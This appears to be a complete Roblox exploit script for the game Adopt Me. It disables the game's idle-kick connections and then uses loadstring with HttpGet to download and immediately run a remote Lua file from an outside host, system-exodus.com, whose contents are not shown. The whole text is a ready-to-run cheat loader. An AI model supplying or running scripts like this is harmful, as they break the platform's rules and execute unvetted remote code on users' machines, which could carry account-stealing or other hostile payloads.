-- Anti AFK
for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.Idled)) do
v:Disable()
end

loadstring(game:HttpGet(('https://system-exodus.com/shared/Introvert/AdoptMe.lua'), true))()